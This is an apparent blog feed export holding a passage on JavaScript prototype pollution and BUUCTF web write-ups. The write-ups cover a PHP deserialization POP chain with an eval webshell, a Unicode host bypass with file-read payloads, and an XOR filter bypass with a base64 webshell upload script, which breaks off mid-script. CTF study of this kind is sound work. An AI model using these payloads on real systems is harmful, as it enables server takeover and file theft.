<code>prototype</code>属性指向一个原型空间,可以理解为实例可以共同访问的空间，间接实现了继承。</p><p><strong><strong>proto</strong>和prototype</strong></p><blockquote><p>由于markdown语法的原因,下文用<code>proto</code>来指代<code>__proto__</code></p></blockquote><p>这两个属性经常让人傻傻分不清楚,这里记录一下我的个人理解</p><p>prototype是函数才会有的,而proto是对象所独有的,由于js万物皆对象，所以函数也有prototype属性, prototype可以理解为指向原型空间的一个属性,所以函数需要该属性来实现继承,而proto是对象所具有的属性,当访问本对象内部不存在的属性时就会去访问proto指向的(父)对象里面寻找,父对象如果找不到会继续透过父对象的proto属性上溯,直至返回null取值触发报错,这样层层上溯就形成了所谓的原型链</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> one = &#123;<span class="string">'x'</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="built_in">console</span>.log(one.__proto__ === obj.prototype);</span><br><span class="line"><span class="built_in">console</span>.log(one.__proto__ === <span class="built_in">Object</span>.prototype);</span><br><span class="line"><span class="built_in">console</span>.log(obj.__proto__ === <span class="built_in">Object</span>.prototype);</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"><span class="comment">//true 在JS中，所有类都最初继承自Object</span></span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">son1 = <span class="keyword">new</span> Father();</span><br><span class="line">son2 = <span class="keyword">new</span> Father();</span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__ === son2.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__ === Father.prototype);</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"><span class="comment">//true 两个实例均指向同一个父类的原型空间</span></span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__ === obj.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__ === <span class="built_in">Object</span>.prototype);</span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__ === <span class="built_in">Object</span>());</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(son1.__proto__.__proto__ === <span class="built_in">Object</span>.prototype);</span><br><span class="line"><span class="comment">//true son1继承自Father，Father继承自Object，所以两次上溯就访问到了Object的原型空间</span></span><br></pre></td></tr></table></figure><h2 id="原型链污染-1"><a href="#原型链污染-1" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>有了以上知识的铺垫,那么思维发散一下就会发现,如果我们通过一proto-修改父类属性,乃至直接上溯到修改Object的类属性,不就可以间接影响到其它类的属性吗?例如下段代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">'key'</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="built_in">console</span>.log (a.key);</span><br><span class="line"><span class="comment">//1</span></span><br><span class="line">a._proto_key = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.key);</span><br><span class="line"><span class="comment">//1:因为a已经有key属性了,不会再向父类上溯了,所以值不变</span></span><br><span class="line">b = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(b.key);</span><br><span class="line"><span class="comment">//向父类继承了key属性,值为2</span></span><br></pre></td></tr></table></figure><p>可以看到新建的b对象虽然为空,但是key属性居然是2,这样就实现了原型链污染。<br>在实际环境中,我们需要寻找能够通过属性键名修改属性值的方法,就有机会触发该漏洞,常用方法有<code>merge</code>和<code>clone</code>等操作</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://www.ruanyifeng.com/blog/2011/06/designing_ideas_of_inheritance_mechanism_in_javascript.html" target="_blank" rel="noopener">Javascript继承机制的设计思想</a><br><a href="https://blog.csdn.net/cc18868876837/article/details/81211729" target="_blank" rel="noopener">https://blog.csdn.net/cc18868876837/article/details/81211729</a><br><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">深入理解JavaScript Prototype污染攻击</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原型链污染学习&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://chaosec.top/categories/CTF/"/>
    
    
      <category term="PrototypePollution" scheme="http://chaosec.top/tags/PrototypePollution/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_WEB(二)</title>
    <link href="http://chaosec.top/2020/09/14/buuctf1/"/>
    <id>http://chaosec.top/2020/09/14/buuctf1/</id>
    <published>2020-09-14T14:58:44.000Z</published>
    <updated>2020-09-14T14:58:44.063Z</updated>
    
    <content type="html"><![CDATA[<p>[强网杯 2019]Upload</p><a id="more"></a><h1 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h1><p>题目流程走了一圈，没发现有什么利用点。查看cookie，发现存在base64编码的反序列化信息，所以猜测有源码泄露，扫目录发现题目存在源码泄露<code>www.tar.gz</code><br>，下载源码之后审计源码，既然题目是<code>Upload</code>，应该和上传有关，查看上传部分代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到上传之后题目都被强制修改后缀为<code>png</code>，无法执行PHP代码，所以要寻找其它漏洞点，结合前面的cookie，查找反序列化相关代码，发现在上传图片后会进行序列化操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'img'</span>]=<span class="keyword">$this</span>-&gt;img;</span><br><span class="line">        cookie(<span class="string">"user"</span>,base64_encode(serialize(<span class="keyword">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>在首页存在反序列化操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>接下来尝试构造pop链<br>在<code>Profile</code>类中，存在两个魔术方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>__call</code>的触发需要调用不存在的方法，而在<code>Register</code>类的析构函数中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>此处调用了不存在的index方法，可以触发<code>__call</code>方法，然后<code>__call</code>方法又可以触发<code>__get</code>方法，这样，通过<code>__get</code>方法可以执行我们想要执行的函数，而在<code>Profile</code>类的<code>upload_img</code>函数正好存在利用点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以通过控制<code>$ext=1</code>是代码进入此流程，先上传恶意图片，然后利用<code>@copy($this-&gt;filename_tmp, $this-&gt;filename);</code>来修改我们上传的文件后缀名从而getshell<br><strong>攻击流程：</strong><br>先上传恶意图片文件，内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_REQUEST[&#39;snow&#39;]); ?&gt;</span><br></pre></td></tr></table></figure><br>查看网页源代码获取到该图片的存储位置，序列化代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;except = <span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp = <span class="string">'./upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.png'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">'./upload/snow.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;registed = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Profile();</span><br><span class="line">$b = <span class="keyword">new</span> Register($a);</span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($b));</span><br></pre></td></tr></table></figure><br>替换cookie后刷新页面，访问上传的图片地址即可getshell</p><h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>本题给出了源代码，是一个flask项目，会返回我们提交的url中的内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl, timeout=<span class="number">2</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure><br>提示我们需要读文件，先是限制了host不能是suctf.cc（如果是函数就返回了），但是后面又显示必须是suctf.cc，关键点就在<code>urlsplit</code>函数，在<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">blackhat2019</a>会议上提到了此漏洞，通过inda编码的字符在进行unicode解码时会导致字符逃逸，例如<code>℀</code>会变成<code>a/c</code>，显然，这样会导致路径插入，比如<code>suctf.c℀om</code>可以变成<code>suctf.ca/com</code>，从而实现逃逸<br>回到本题，我们可以直接找一个能解码成<code>c</code>的特殊字符即可<br><img src="/2020/09/14/buuctf1/1.png" alt><br>payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;suctf.cⅭ&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">file:&#x2F;&#x2F;suctf.cⅭ&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure></p><h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><p>题目给出了源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">    <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>题目过滤了大量字符，经测试还有<code>^</code>可以用，参考p牛的方法使用异或进行代码执行，因为存在长度限制，所以使用字符数比较短的GET变量<br><strong>小知识点： 在PHP中，url 参数默认是字符串类型</strong><br>fuzz脚本：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$s = <span class="string">'_GET'</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">'%'</span>.dechex(<span class="number">244</span>).<span class="string">' '</span>);</span><br><span class="line"><span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;strlen($s);$j++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">        $a = chr(<span class="number">244</span>)^chr($i);</span><br><span class="line">        <span class="keyword">if</span>($a == $s[$j])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'%'</span>.dechex($i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ab%b3%b1%a0^%f4%f4%f4%f4&#125;&#123;%f4&#125;();&amp;%f4&#x3D;phpinfo</span><br></pre></td></tr></table></figure><br>由于长度受限，我们只能执行简单的函数，想要进行读文件等操作还是需要getshell，题目还给出了<code>get_the_flag</code>函数，其中存在上传功能，可以利用此函数进行文件上传，该函数存在过滤点</p><ol><li>后缀检测</li><li>文件内容检测，文件中不得出现<code>&lt;?</code></li><li>exif_imagetype</li></ol><p>可以通过文件上传加<code>.htaccess</code>进行绕过，代码没有表单，可以找个上传点抓包然后和本题数据包拼接一下就可以上传了，绕过2处的过滤，需要对PHP文件进行编码<br><img src="/2020/09/14/buuctf1/2.png" alt><br><strong>PS:</strong>因为是base64编码，所以要保证字符长度是4的倍数，如果不够的话要自己凑一下<br><img src="/2020/09/14/buuctf1/3.png" alt><br>然后访问a.ooo即可解析为PHP代码<br>当然，也可以使用脚本上传<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r"http://84ae465d-bec5-48bb-965b-bd7f4b51394f.node3.buuoj.cn/?_=$&#123;%ab%b3%b1%a0^%f4%f4%f4%f4&#125;&#123;%f4&#125;();&amp;%f4=get_the_flag"</span></span><br><span class="line">file1 = &#123;<span class="string">'file'</span>: (<span class="string">'a.ooo'</span>, <span class="string">'GIF89aaa\nPD9waHAgQGV2YWwoJF9SRVFVRVNUWyJzbm93Il0pO3BocGluZm8oKTs/Pg=='</span>)&#125;</span><br><span class="line">file2 = &#123;<span class="string">'file'</span>: (<span class="string">'.htaccess'</span>, <span class="string">'#define width 45\n#define height 45\nAddType 